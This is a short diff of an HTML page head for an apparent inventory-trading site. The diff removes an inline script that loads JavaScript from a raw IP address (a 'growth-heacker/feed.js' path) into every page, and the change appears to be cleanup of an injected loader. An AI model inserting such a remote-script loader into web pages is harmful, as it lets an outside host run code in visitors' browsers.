@@ -2,11 +2,7 @@
 <html lang="en" class="no-js">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
-<script type="text/javascript">
-var key = 1;
 
-(function(a) {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);}(window, document))
-</script>
 
 <meta charset="utf-8"/>
 <title>Online Sell and Purchase Non Moving Inventory</title>
